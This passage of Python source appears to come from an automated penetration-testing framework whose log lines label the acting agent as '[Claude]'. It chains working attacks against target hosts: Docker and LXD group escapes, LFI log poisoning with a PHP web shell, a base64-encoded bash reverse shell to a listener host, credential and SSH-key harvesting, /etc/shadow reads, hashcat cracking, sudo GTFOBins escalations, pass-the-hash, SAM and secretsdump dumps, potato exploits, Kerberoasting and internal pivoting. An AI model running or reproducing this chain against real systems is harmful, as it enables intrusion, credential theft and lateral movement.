                    "cve": "",
                }], target)

        # ── Docker group escape ───────────────────────────────────────────
        docker_out = ssh_exec(
            "id | grep -qE 'docker|lxd|lxc' && echo USER_IN_DOCKER_GROUP || echo not_in_docker_group; "
            "groups 2>/dev/null",
            "docker-group-check",
        )
        if "USER_IN_DOCKER_GROUP" in docker_out:
            self._log(f"[Claude] LOCAL-PRIVESC: usuario en grupo docker → escapando!")
            docker_escape = ssh_exec(
                "# Docker group escape → mount host root\n"
                "docker run --rm -v /:/mnt alpine sh -c "
                "'id; cat /mnt/root/root.txt 2>/dev/null; "
                "cp /mnt/bin/bash /mnt/tmp/.dockerbash 2>/dev/null && chmod +s /mnt/tmp/.dockerbash; "
                "echo DOCKER_ESCAPE_SUCCESS; cat /mnt/etc/shadow | head -5' 2>/dev/null",
                "docker-escape", timeout=60,
            )
            self._capture_evidence(docker_escape, target, "docker-escape", "docker group escape")
            accumulated_output.append(f"=== Docker Group Escape ===\n{docker_escape[:500]}")
            self._save_findings([{
                "title": f"Privilege Escalation: Docker Group Escape @ {target}",
                "severity": "critical",
                "description": f"Usuario {user} en grupo docker → monta raíz del host → root.",
                "cve": "",
            }], target)

        # ── LXD/LXC group escape ──────────────────────────────────────────
        if "lxd" in docker_out or "lxc" in docker_out:
            self._log(f"[Claude] LOCAL-PRIVESC: usuario en grupo lxd → escapando!")
            lxd_escape = ssh_exec(
                "# LXD escape via Alpine image import\n"
                "lxc image list 2>/dev/null | head -5; "
                "lxc list 2>/dev/null | head -5; "
                "lxc init ubuntu:18.04 privesc-container 2>/dev/null || true; "
                "lxc config device add privesc-container host-root disk source=/ path=/mnt/root recursive=true 2>/dev/null && "
                "lxc config set privesc-container security.privileged true 2>/dev/null && "
                "lxc start privesc-container 2>/dev/null && "
                "lxc exec privesc-container -- sh -c 'cat /mnt/root/root/root.txt 2>/dev/null; echo LXD_ESCAPE_SUCCESS' 2>/dev/null; "
                "lxc stop privesc-container --force 2>/dev/null; lxc delete privesc-container 2>/dev/null",
                "lxd-escape", timeout=90,
            )
            self._capture_evidence(lxd_escape, target, "lxd-escape", "lxd group escape")
            accumulated_output.append(f"=== LXD Group Escape ===\n{lxd_escape[:500]}")
            self._save_findings([{
                "title": f"Privilege Escalation: LXD Group Escape @ {target}",
                "severity": "critical",
                "description": f"Usuario {user} en grupo lxd → contenedor privilegiado → root del host.",
                "cve": "",
            }], target)

    # ─────────────────────────────────────────────────────────────────────────
    # Feature 3: LFI → Log Poisoning → RCE chain
    # ─────────────────────────────────────────────────────────────────────────
    def _lfi_to_rce_chain(self, target, port, lfi_param, lfi_url, accumulated_output):
        """
        Given a confirmed LFI (lfi_url with lfi_param), escalate to RCE via:
        1. Apache/Nginx log poisoning
        2. PHP session file include
        3. /proc/self/environ injection
        4. /proc/self/fd/*
        """
        self._log(f"[Claude] LFI→RCE chain: {lfi_url} param={lfi_param}")
        proto = "https" if port in (443, 8443) else "http"
        base_url = f"{proto}://{target}:{port}"
        results = []

        # ── 1. Apache/Nginx log poisoning ────────────────────────────────
        self._log(f"[Claude] LFI→RCE: log poisoning attempt")
        # Poison the log with PHP code via User-Agent
        poison_out, _ = self._run_cmd(
            "lfi-log-poison-inject",
            f"curl -s --max-time 10 '{base_url}/' "
            f"-A '<?php system($_GET[\"cmd\"]); ?>' 2>/dev/null | head -3; "
            f"echo 'LOG_POISONED'",
            target, timeout=15,
        )
        # Try common log paths
        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access_log",
            "/proc/self/fd/2",
            "/var/log/vsftpd.log",
            "/var/log/auth.log",
        ]
        for log_path in log_paths:
            lfi_test, _ = self._run_cmd(
                f"lfi-log-rce-{log_path.replace('/', '_')}",
                f"curl -s --max-time 10 "
                f"'{lfi_url}?{lfi_param}={log_path}&cmd=id' 2>/dev/null | grep -oE 'uid=[0-9]+[^<\"]*' | head -3; "
                f"curl -s --max-time 10 "
                f"'{lfi_url}?{lfi_param}={log_path}&cmd=id' 2>/dev/null | grep 'uid=' | head -2",
                target, timeout=15,
            )
            if "uid=" in lfi_test:
                self._log(f"[Claude] LFI→RCE via log poisoning: {log_path} → RCE!")
                self._capture_evidence(lfi_test, target, "lfi-log-rce", f"LFI→log {log_path}")
                results.append(f"=== LFI Log Poison RCE ({log_path}) ===\n{lfi_test[:400]}")
                # Upgrade to reverse shell
                revshell_b64 = f"bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1"
                import base64
                b64 = base64.b64encode(revshell_b64.encode()).decode()
                self._run_cmd(
                    "lfi-log-revshell",
                    f"curl -s --max-time 20 "
                    f"'{lfi_url}?{lfi_param}={log_path}&cmd=bash+-c+\"echo+{b64}|base64+-d|bash\"' 2>/dev/null",
                    target, timeout=25,
                )
                self._save_findings([{
                    "title": f"LFI → Log Poisoning → RCE @ {target}:{port}",
                    "severity": "critical",
                    "description": f"LFI en {lfi_url} (param={lfi_param}) + log poisoning via {log_path} → ejecución de comandos.\nEvidencia: {lfi_test[:200]}",
                    "cve": "",
                }], target)
                break

        # ── 2. PHP session file include ───────────────────────────────────
        self._log(f"[Claude] LFI→RCE: PHP session include attempt")
        sess_out, _ = self._run_cmd(
            "lfi-session-inject",
            f"# Set PHP session with payload\n"
            f"SESSID=$(curl -s --max-time 10 -c /tmp/lfi_cookie_{target.replace('.','_')} '{base_url}/' 2>/dev/null | "
            f"grep -oP 'PHPSESSID=[a-z0-9]+' | head -1 | cut -d= -f2); "
            f"[ -z \"$SESSID\" ] && SESSID=$(python3 -c 'import os; print(os.urandom(16).hex())' 2>/dev/null); "
            f"curl -s --max-time 10 -H 'Cookie: PHPSESSID='$SESSID "
            f"'{base_url}/?input=<?php system(\\$_GET[\\\"cmd\\\"]); ?>' 2>/dev/null | head -3; "
            f"# Try to include /var/lib/php/sessions/sess_$SESSID\n"
            f"curl -s --max-time 10 -H 'Cookie: PHPSESSID='$SESSID "
            f"'{lfi_url}?{lfi_param}=/var/lib/php/sessions/sess_'$SESSID'&cmd=id' 2>/dev/null | grep 'uid=' | head -2; "
            f"curl -s --max-time 10 -H 'Cookie: PHPSESSID='$SESSID "
            f"'{lfi_url}?{lfi_param}=/tmp/sess_'$SESSID'&cmd=id' 2>/dev/null | grep 'uid=' | head -2",
            target, timeout=30,
        )
        if "uid=" in sess_out:
            self._capture_evidence(sess_out, target, "lfi-session-rce", "LFI→PHP session")
            results.append(f"=== LFI PHP Session RCE ===\n{sess_out[:400]}")
            self._save_findings([{
                "title": f"LFI → PHP Session Injection → RCE @ {target}:{port}",
                "severity": "critical",
                "description": f"LFI + inyección en sesión PHP → RCE. {sess_out[:200]}",
                "cve": "",
            }], target)

        # ── 3. /proc/self/environ injection ──────────────────────────────
        environ_out, _ = self._run_cmd(
            "lfi-environ-rce",
            f"curl -s --max-time 10 "
            f"-A '<?php system(\\$_GET[\"cmd\"]); ?>'"
            f"'{lfi_url}?{lfi_param}=/proc/self/environ&cmd=id' 2>/dev/null | grep 'uid=' | head -2",
            target, timeout=15,
        )
        if "uid=" in environ_out:
            self._capture_evidence(environ_out, target, "lfi-environ-rce", "LFI→/proc/self/environ")
            results.append(f"=== LFI /proc/self/environ RCE ===\n{environ_out[:300]}")
            self._save_findings([{
                "title": f"LFI → /proc/self/environ → RCE @ {target}:{port}",
                "severity": "critical",
                "description": f"LFI + HTTP_USER_AGENT PHP injection via /proc/self/environ → RCE.",
                "cve": "",
            }], target)

        if results:
            accumulated_output.extend(results)

    # ─────────────────────────────────────────────────────────────────────────
    # Feature 4: Auto hashcat when hashes found
    # ─────────────────────────────────────────────────────────────────────────
    def _auto_crack_hashes(self, output_text, target, accumulated_output):
        """Detect hash types in output and launch hashcat with rockyou.txt."""
        # Hash format → (hashcat mode, name)
        HASH_PATTERNS = [
            (r'\$6\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{86}', 1800, "sha512crypt"),
            (r'\$5\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{43}', 7400, "sha256crypt"),
            (r'\$1\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{22}', 500,  "md5crypt"),
            (r'\$2[aby]\$\d+\$[a-zA-Z0-9./]{53}', 3200, "bcrypt"),
            (r'[a-fA-F0-9]{32}:[a-fA-F0-9]{32}', 1000, "NTLM"),
            (r'[a-fA-F0-9]{32}(?:[^:]|$)', 0, "MD5"),
            (r'[a-fA-F0-9]{40}(?:[^:]|$)', 100, "SHA1"),
            (r'[a-fA-F0-9]{64}(?:[^:]|$)', 1400, "SHA256"),
            (r'aad3b435b51404eeaad3b435b51404ee:[a-fA-F0-9]{32}', 1000, "NTLM-empty-LM"),
        ]

        found_hashes = {}
        for pattern, mode, name in HASH_PATTERNS:
            matches = re.findall(pattern, output_text)
            if matches:
                for h in matches[:5]:  # max 5 per type
                    h = h.strip()
                    if len(h) > 8:
                        found_hashes.setdefault(name, (mode, []))[1].append(h)

        if not found_hashes:
            return

        self._log(f"[Claude] HASHCAT: encontrados {len(found_hashes)} tipos de hashes → crackeando")
        rockyou_paths = ["/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz",
                         "/opt/rockyou.txt", "/home/kali/rockyou.txt"]

        rockyou = next((p for p in rockyou_paths if __import__('os').path.exists(p)), None)
        if not rockyou:
            self._log(f"[Claude] HASHCAT: rockyou.txt no encontrado, saltando")
            return

        # Decompress if gzipped
        if rockyou.endswith(".gz"):
            self._run_cmd("decompress-rockyou",
                          f"gunzip -k {rockyou} 2>/dev/null; ls /usr/share/wordlists/rockyou.txt",
                          target, timeout=30)
            rockyou = rockyou[:-3]

        for name, (mode, hashes) in found_hashes.items():
            hash_file = f"/tmp/hashes_{target.replace('.','_')}_{name}.txt"
            with open(hash_file, "w") as hf:
                hf.write("\n".join(dict.fromkeys(hashes)))
            self._log(f"[Claude] HASHCAT: cracking {len(hashes)} hashes {name} (mode {mode})")
            crack_out, _ = self._run_cmd(
                f"hashcat-{name}",
                f"hashcat -a 0 -m {mode} --force --quiet "
                f"--potfile-path /tmp/hashcat_{target.replace('.','_')}.pot "
                f"-r /usr/share/hashcat/rules/best64.rule 2>/dev/null "
                f"{hash_file} {rockyou} 2>/dev/null | tail -20; "
                f"hashcat -m {mode} --force --quiet --show "
                f"--potfile-path /tmp/hashcat_{target.replace('.','_')}.pot "
                f"{hash_file} 2>/dev/null | head -10",
                target, timeout=300,  # 5 minutes max per hash type
            )
            cracked = re.findall(r'([a-fA-F0-9$./]{20,}):(\S+)', crack_out)
            if cracked:
                self._log(f"[Claude] HASHCAT: {len(cracked)} contraseñas crackeadas: {[c[1] for c in cracked[:3]]}")
                accumulated_output.append(f"=== Hashes Crackeados ({name}) ===\n{crack_out[:600]}")
                for hash_val, plain in cracked[:5]:
                    MEMORY.remember_cred(target, "cracked", hash_val[:20], plain)
                self._save_findings([{
                    "title": f"Contraseñas Crackeadas ({name}) @ {target}",
                    "severity": "high",
                    "description": f"{len(cracked)} hashes {name} crackeados con rockyou.txt:\n" +
                                   "\n".join(f"  {h[:20]}... → {p}" for h, p in cracked[:5]),
                    "cve": "",
                }], target)

    # ─────────────────────────────────────────────────────────────────────────
    # Feature 2 + 5: Full post-exploitation chain (with Linpeas)
    # ─────────────────────────────────────────────────────────────────────────
    def _post_exploit_chain(self, target, user, pwd, accumulated_output):
        """
        Full post-exploitation orchestrator after gaining SSH access.
        1. Basic enumeration (id, uname, network, flags)
        2. Linpeas auto-run + parse output
        3. Kernel privesc check
        4. Linux local privesc (cron, caps, docker)
        5. Hash extraction + cracking
        6. Credential hunting (SSH keys, config files, .bash_history)
        """
        self._log(f"[Claude] POST-EXPLOIT: iniciando cadena completa → {target} ({user})")

        def ssh_exec(cmd, label, timeout=60):
            full = (
                f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
                f"-o BatchMode=no {user}@{target} '{cmd}' 2>/dev/null"
            )
            out, _ = self._run_cmd(label, full, target, timeout=timeout)
            return out

        def scp_put(local_path, remote_path, label):
            full = (
                f"sshpass -p '{pwd}' scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
                f"{local_path} {user}@{target}:{remote_path} 2>/dev/null"
            )
            self._run_cmd(label, full, target, timeout=30)

        # ── Step 1: Basic enumeration ─────────────────────────────────────
        basic = ssh_exec(
            "id; whoami; hostname; uname -a; "
            "cat /etc/os-release 2>/dev/null | head -5; "
            "ip a 2>/dev/null | grep 'inet ' | head -5; "
            "netstat -tulpn 2>/dev/null | head -15 || ss -tulpn 2>/dev/null | head -15; "
            "ps aux 2>/dev/null | head -20; "
            "cat /etc/passwd | grep -v 'nologin\\|false' | head -15; "
            "sudo -l 2>/dev/null | head -20; "
            "find / -perm -4000 -type f 2>/dev/null | head -20; "
            "cat ~/user.txt ~/flag.txt 2>/dev/null; "
            "find /home -name 'user.txt' -o -name 'flag.txt' 2>/dev/null | head -5 | xargs cat 2>/dev/null",
            "post-exploit-enum", timeout=60,
        )
        accumulated_output.append(f"=== POST-EXPLOIT Basic Enum {target} ({user}) ===\n{basic[:1200]}")
        self._capture_evidence(basic, target, "post-exploit-enum", f"ssh {user}@{target}")

        # Extract kernel version
        kernel_match = re.search(r'Linux\s+\S+\s+([\d.]+)', basic)
        kernel_ver = kernel_match.group(1) if kernel_match else ""

        # ── Step 2: Credential hunting ────────────────────────────────────
        creds_hunt = ssh_exec(
            "# Bash history\n"
            "cat ~/.bash_history 2>/dev/null | grep -iE 'password|passwd|pass|secret|key|token|mysql|ssh' | head -20; "
            "# SSH private keys\n"
            "find /home /root ~/.ssh 2>/dev/null -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | "
            "xargs ls -la 2>/dev/null | head -10; "
            "cat ~/.ssh/id_rsa 2>/dev/null | head -20; "
            "# Config files with passwords\n"
            "grep -rE 'password[[:space:]]*=|passwd[[:space:]]*=|DB_PASS|db_password' "
            "/var/www/html /opt /srv /home 2>/dev/null --include='*.php' --include='*.conf' --include='*.env' "
            "--include='*.ini' --include='*.yaml' --include='*.yml' -l 2>/dev/null | head -10 | "
            "xargs grep -hE 'password|passwd|DB_PASS' 2>/dev/null | grep -v '#' | head -20; "
            "# Shadow file (if root)\n"
            "cat /etc/shadow 2>/dev/null | head -20",
            "post-cred-hunt", timeout=60,
        )
        accumulated_output.append(f"=== POST-EXPLOIT Creds Hunt ===\n{creds_hunt[:800]}")
        self._auto_crack_hashes(creds_hunt, target, accumulated_output)

        # ── Step 3: Linpeas ───────────────────────────────────────────────
        self._log(f"[Claude] POST-EXPLOIT: ejecutando linpeas @ {target}")
        linpeas_out = ssh_exec(
            "# Download and run linpeas\n"
            "LINPEAS_URL='https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'; "
            "if command -v curl &>/dev/null; then "
            "  curl -sL --max-time 30 $LINPEAS_URL -o /tmp/linpeas.sh 2>/dev/null; "
            "elif command -v wget &>/dev/null; then "
            "  wget -qO /tmp/linpeas.sh --timeout=30 $LINPEAS_URL 2>/dev/null; "
            "fi; "
            "chmod +x /tmp/linpeas.sh 2>/dev/null && "
            "timeout 120 /tmp/linpeas.sh -q 2>/dev/null | "
            "grep -E 'CVE-|SUID|sudo|capabilities|writable|password|NOPASSWD|docker|lxd|99%|95%' | "
            "head -60",
            "linpeas-run", timeout=150,
        )
        if linpeas_out.strip():
            accumulated_output.append(f"=== Linpeas Output ({target}) ===\n{linpeas_out[:2000]}")
            # Parse CVEs from linpeas output
            cves_found = re.findall(r'CVE-\d{4}-\d+', linpeas_out)
            cves_unique = list(dict.fromkeys(cves_found))[:10]
            if cves_unique:
                self._log(f"[Claude] Linpeas sugiere CVEs: {cves_unique}")
                self._save_findings([{
                    "title": f"Linpeas: CVEs Detectados en Sistema Local @ {target}",
                    "severity": "high",
                    "description": f"Linpeas detectó posibles CVEs en sistema local: {', '.join(cves_unique)}\n"
                                   f"Detalles:\n{linpeas_out[:500]}",
                    "cve": cves_unique[0] if cves_unique else "",
                }], target)

            # Parse NOPASSWD sudo entries
            nopasswd = re.findall(r'NOPASSWD[^\\n]*', linpeas_out)
            for sudo_entry in nopasswd[:3]:
                sudo_bin = re.search(r'(/[^\s,)]+)', sudo_entry)
                if sudo_bin:
                    bin_name = sudo_bin.group(1).split("/")[-1].lower()
                    self._log(f"[Claude] POST-EXPLOIT: sudo NOPASSWD → {sudo_bin.group(1)}")
                    sudo_gtfo = {
                        "find": f"sudo find . -exec /bin/sh \\; 2>/dev/null; sudo find / -name '*.txt' -exec cat {{}} \\; 2>/dev/null | grep -i 'flag\\|root' | head -5",
                        "vim": f"sudo vim -c ':!id>/tmp/sudo_proof.txt' -c ':q' 2>/dev/null; cat /tmp/sudo_proof.txt",
                        "nano": f"sudo nano /etc/sudoers 2>/dev/null | head -5; sudo nano /root/root.txt 2>/dev/null | head -3",
                        "python3": f"sudo python3 -c 'import os; os.system(\"id>/tmp/sudo_proof.txt; cat /root/root.txt>>/tmp/sudo_proof.txt 2>/dev/null\")' 2>/dev/null; cat /tmp/sudo_proof.txt",
                        "python": f"sudo python -c 'import os; os.system(\"id>/tmp/sudo_proof.txt; cat /root/root.txt>>/tmp/sudo_proof.txt 2>/dev/null\")' 2>/dev/null; cat /tmp/sudo_proof.txt",
                        "perl": f"sudo perl -e 'system(\"id>/tmp/sudo_proof.txt\")' 2>/dev/null; cat /tmp/sudo_proof.txt",
                        "bash": f"sudo bash -c 'id>/tmp/sudo_proof.txt; cat /root/root.txt>>/tmp/sudo_proof.txt 2>/dev/null' 2>/dev/null; cat /tmp/sudo_proof.txt",
                        "less": f"sudo less /etc/shadow 2>/dev/null | head -5 >/tmp/sudo_proof.txt; cat /tmp/sudo_proof.txt",
                        "more": f"sudo more /etc/shadow 2>/dev/null | head -5 >/tmp/sudo_proof.txt; cat /tmp/sudo_proof.txt",
                        "awk": f"sudo awk 'BEGIN {{system(\"id>/tmp/sudo_proof.txt\")}}' 2>/dev/null; cat /tmp/sudo_proof.txt",
                        "nmap": f"echo 'os.execute(\"/bin/sh\")' > /tmp/nmap_priv.nse && sudo nmap --script /tmp/nmap_priv.nse localhost 2>/dev/null | head -5",
                        "tcpdump": f"sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/privesc_tcpdump.sh 2>/dev/null & sleep 2",
                        "git": f"sudo git help config --exec-path 2>/dev/null; sudo git -p help 2>/dev/null | head -3",
                        "env": f"sudo env /bin/bash 2>/dev/null -c 'id>/tmp/sudo_proof.txt; cat /root/root.txt>>/tmp/sudo_proof.txt 2>/dev/null'; cat /tmp/sudo_proof.txt",
                        "tar": f"sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c \"id>/tmp/sudo_proof.txt\"' 2>/dev/null; cat /tmp/sudo_proof.txt",
                    }
                    gtfo_cmd = sudo_gtfo.get(bin_name, f"sudo {sudo_bin.group(1)} --help 2>/dev/null | head -3")
                    sudo_out = ssh_exec(gtfo_cmd, f"sudo-gtfo-{bin_name}", timeout=30)
                    self._capture_evidence(sudo_out, target, f"sudo-gtfo-{bin_name}", f"sudo NOPASSWD {sudo_bin.group(1)}")
                    accumulated_output.append(f"=== Sudo NOPASSWD {sudo_bin.group(1)} ===\n{sudo_out[:400]}")
                    self._save_findings([{
                        "title": f"Sudo NOPASSWD Privesc: {sudo_bin.group(1)} @ {target}",
                        "severity": "critical",
                        "description": f"Usuario {user} puede ejecutar {sudo_bin.group(1)} como root sin contraseña → escalada.\n{sudo_out[:200]}",
                        "cve": "",
                    }], target)

        # ── Step 4: Kernel + local privesc ────────────────────────────────
        if kernel_ver:
            self._kernel_privesc(target, user, pwd, kernel_ver, accumulated_output)
        self._linux_local_privesc(target, user, pwd, accumulated_output)

        # ── Step 5: Network discovery for pivoting ────────────────────────
        net_disc = ssh_exec(
            "ip route 2>/dev/null; "
            "cat /etc/hosts 2>/dev/null; "
            "# Quick internal subnet scan\n"
            "IFACE_IP=$(ip a 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -1); "
            "SUBNET=$(echo $IFACE_IP | sed 's|\\.[0-9]*/.*|.0/24|'); "
            "echo \"Internal network: $SUBNET\"; "
            "command -v nmap &>/dev/null && nmap -T4 --open -p 22,80,443,445,3389 $SUBNET 2>/dev/null | "
            "grep -E 'Nmap scan|open|Host is up' | head -30 || "
            "for i in $(seq 1 254); do "
            "  (ping -c1 -W1 $(echo $SUBNET | sed 's|0/24||')$i &>/dev/null && "
            "   echo \"UP: $(echo $SUBNET | sed 's|0/24||')$i\") & "
            "done; wait 2>/dev/null | head -20",
            "post-net-discovery", timeout=90,
        )
        accumulated_output.append(f"=== POST-EXPLOIT Network Discovery ===\n{net_disc[:800]}")
        # Extract new targets
        new_ips = re.findall(r'(?:UP|open):[^\d]*(\d+\.\d+\.\d+\.\d+)', net_disc)
        if new_ips:
            self._log(f"[Claude] POST-EXPLOIT: redes internas descubiertas: {new_ips[:5]}")
            self._save_findings([{
                "title": f"Pivoting: Hosts Internos Descubiertos @ {target}",
                "severity": "medium",
                "description": f"Desde {target} se ven {len(new_ips)} hosts internos: {', '.join(new_ips[:10])}",
                "cve": "",
            }], target)

        # ── Step 6: Set up SOCKS5 pivot if internal hosts discovered ─────
        if new_ips:
            self._setup_pivot(target, user, pwd, accumulated_output)

        # ── Step 7: Establish persistence ────────────────────────────────
        # Detect if we have root/sudo access from earlier steps
        _combined_out = "\n".join(accumulated_output[-20:])
        _is_root = bool(re.search(r'uid=0\(root\)|root@|#\s*$|NOPASSWD.*ALL|SYSTEM', _combined_out, re.IGNORECASE))
        self._establish_persistence(target, user, pwd, _is_root, accumulated_output)

    # ─────────────────────────────────────────────────────────────────────────
    # Windows post-exploitation chain (secretsdump, pass-the-hash, potato)
    # ─────────────────────────────────────────────────────────────────────────
    def _windows_post_exploit(self, target, user, pwd, shell_output, accumulated_output):
        """Full Windows post-exploitation: dump hashes, pass-the-hash, privilege escalation."""
        self._log(f"[Claude] WIN-POST-EXPLOIT: {target} ({user or 'session'})")
        auth_args = f"-u '{user}' -p '{pwd}'" if user and pwd else ""
        t_safe = target.replace(".", "_")

        # ── 1. secretsdump — extract all hashes ───────────────────────────
        self._log(f"[Claude] WIN-POST-EXPLOIT: secretsdump → volcando hashes")
        dump_cmd = (
            f"impacket-secretsdump {auth_args} {target} 2>/dev/null | head -60"
            if auth_args else
            f"impacket-secretsdump -no-pass {target} 2>/dev/null | head -60"
        )
        dump_out, _ = self._run_cmd("win-secretsdump", dump_cmd, target, timeout=60)
        if dump_out.strip():
            accumulated_output.append(f"=== secretsdump {target} ===\n{dump_out[:1200]}")
            self._auto_crack_hashes(dump_out, target, accumulated_output)
            # Extract NTLM hashes for pass-the-hash
            ntlm_hashes = re.findall(r'(\w+):[^:]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', dump_out)
            for uname, lm, nt in ntlm_hashes[:5]:
                self._log(f"[Claude] WIN-POST-EXPLOIT: PTH → {uname}:{nt[:16]}...")
                pth_out, _ = self._run_cmd(
                    f"win-pth-{uname}",
                    f"crackmapexec smb {target} -u '{uname}' -H '{nt}' --shares 2>/dev/null | head -10; "
                    f"impacket-psexec -hashes ':{nt}' {uname}@{target} 'whoami && ipconfig && type C:\\Users\\Administrator\\Desktop\\root.txt 2>nul' 2>/dev/null | head -15",
                    target, timeout=40,
                )
                self._capture_evidence(pth_out, target, f"win-pth-{uname}", f"pass-the-hash {uname}")
                if any(k in pth_out.lower() for k in ["nt authority", "administrator", "pwn3d"]):
                    accumulated_output.append(f"=== Pass-The-Hash {uname} ===\n{pth_out[:600]}")
                    self._save_findings([{
                        "title": f"Pass-The-Hash Exitoso: {uname} @ {target}",
                        "severity": "critical",
                        "description": f"Hash NTLM de {uname} válido para autenticación PTH:\n{pth_out[:300]}",
                        "cve": "",
                    }], target)

        # ── 2. Check SeImpersonatePrivilege → PrintSpoofer/GodPotato ────
        self._log(f"[Claude] WIN-POST-EXPLOIT: verificando SeImpersonatePrivilege")
        if user and pwd:
            priv_out, _ = self._run_cmd(
                "win-whoami-priv",
                f"crackmapexec smb {target} -u '{user}' -p '{pwd}' -x 'whoami /priv' 2>/dev/null | head -20",
                target, timeout=20,
            )
            if "SeImpersonatePrivilege" in priv_out or "SeAssignPrimaryTokenPrivilege" in priv_out:
                self._log(f"[Claude] WIN-POST-EXPLOIT: SeImpersonatePrivilege → PrintSpoofer!")
                potato_out, _ = self._run_cmd(
                    "win-printspoofer",
                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
                    f"--put-file /tmp/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe 2>/dev/null; "
                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
                    f"-x 'C:\\Windows\\Temp\\ps.exe -i -c \"whoami && type C:\\Users\\Administrator\\Desktop\\root.txt\"' 2>/dev/null | head -10; "
                    f"# Alternative: GodPotato\n"
                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
                    f"--put-file /tmp/GodPotato.exe C:\\Windows\\Temp\\gp.exe 2>/dev/null; "
                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
                    f"-x 'C:\\Windows\\Temp\\gp.exe -cmd \"whoami\"' 2>/dev/null | head -5",
                    target, timeout=60,
                )
                self._capture_evidence(potato_out, target, "win-printspoofer", "PrintSpoofer/GodPotato")
                accumulated_output.append(f"=== PrintSpoofer/GodPotato ===\n{potato_out[:600]}")
                self._save_findings([{
                    "title": f"Windows PrivEsc: SeImpersonatePrivilege → SYSTEM @ {target}",
                    "severity": "critical",
                    "description": f"SeImpersonatePrivilege disponible → PrintSpoofer/GodPotato → NT AUTHORITY\\SYSTEM.\n{potato_out[:300]}",
                    "cve": "",
                }], target)

        # ── 3. SAM + NTDS backup dump (SeBackupPrivilege) ─────────────────
        if user and pwd:
            backup_out, _ = self._run_cmd(
                "win-sam-dump",
                f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
                f"-x 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv & "
                f"reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv' 2>/dev/null | head -5; "
                f"impacket-smbclient {auth_args} //{target}/C$ 2>/dev/null -c "
                f"'get Windows\\Temp\\sam.hiv /tmp/sam_{t_safe}.hiv; "
                f"get Windows\\Temp\\sys.hiv /tmp/sys_{t_safe}.hiv' 2>/dev/null; "
                f"impacket-secretsdump -sam /tmp/sam_{t_safe}.hiv -system /tmp/sys_{t_safe}.hiv LOCAL 2>/dev/null | head -20",
                target, timeout=60,
            )
            if ":" in backup_out and "aad3b435" in backup_out.lower():
                self._auto_crack_hashes(backup_out, target, accumulated_output)
                accumulated_output.append(f"=== SAM Dump ===\n{backup_out[:600]}")

        # ── 4. AD recon + DCSync + lateral movement (if domain controller) ──
        dc_indicators = ["domain controller", "active directory", "ldap", "kerberos", "win-dc"]
        _open_port_set = {p["port"] for p in ([] if not hasattr(self, "_last_open_ports") else self._last_open_ports)}
        if any(ind in (shell_output or "").lower() for ind in dc_indicators) or 88 in _open_port_set:
            self._ad_attacks(target, user, pwd, accumulated_output)
            # DCSync + Golden Ticket — requires domain admin or replication rights
            self._dcsync_golden_ticket(target, user, pwd, accumulated_output)

        # ── 5. Lateral movement to all discovered Windows hosts ───────────
        creds_and_hashes = []
        _dump_text = "\n".join(accumulated_output[-30:])
        # Collect NTLM hashes found during this session
        for _u, _lm, _nt in re.findall(r'(\w+):[^:]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', _dump_text):
            creds_and_hashes.append({"user": _u, "hash": _nt, "type": "ntlm"})
        # Collect cleartext credentials
        for _cu, _cp in re.findall(r'(?:user|login)[:\s]+(\w+).*?(?:pass|pwd)[:\s]+(\S+)', _dump_text, re.IGNORECASE | re.DOTALL):
            creds_and_hashes.append({"user": _cu, "password": _cp, "type": "cleartext"})
        if creds_and_hashes:
            self._lateral_movement_windows(target, self._last_open_ports if hasattr(self, "_last_open_ports") else [], creds_and_hashes, accumulated_output)

        # ── G1: BloodHound full chain (if we have credentials) ────────────
        if user and pwd:
            self._bloodhound_ad_chain(target, user, pwd, accumulated_output)

    # ─────────────────────────────────────────────────────────────────────────
    # Active Directory attacks (Kerberoasting, AS-REP, BloodHound)
    # ─────────────────────────────────────────────────────────────────────────
    def _ad_attacks(self, target, user, pwd, accumulated_output):
        """Kerberoasting, AS-REP Roasting, and basic AD enumeration."""
        self._log(f"[Claude] AD-ATTACKS: Kerberoasting + AS-REP @ {target}")
        auth = f"-u '{user}' -p '{pwd}'" if user and pwd else ""
        t_safe = target.replace(".", "_")

        # ── Enumerate domain + DC ─────────────────────────────────────────
        enum_out, _ = self._run_cmd(
            "ad-enum",
            f"crackmapexec smb {target} {auth} --users 2>/dev/null | head -30; "
            f"crackmapexec smb {target} {auth} --groups 2>/dev/null | head -20; "
            f"crackmapexec ldap {target} {auth} --users 2>/dev/null | head -20",
            target, timeout=40,
        )
        if enum_out.strip():
            accumulated_output.append(f"=== AD Enumeration ===\n{enum_out[:800]}")
            # Extract domain name
            domain_match = re.search(r'domain:([^\s]+)', enum_out, re.IGNORECASE)
            domain = domain_match.group(1) if domain_match else ""

        # ── Kerberoasting — get service tickets for offline cracking ─────
        self._log(f"[Claude] AD-ATTACKS: Kerberoasting")
        kerb_out, _ = self._run_cmd(
            "kerberoasting",
            f"impacket-GetUserSPNs {auth} -dc-ip {target} "
            f"{'domain/' if not auth else ''}{target} -request 2>/dev/null | head -40; "
            f"# Also try with crackmapexec\n"
            f"crackmapexec ldap {target} {auth} --kerberoasting /tmp/kerb_{t_safe}.txt 2>/dev/null | head -10; "
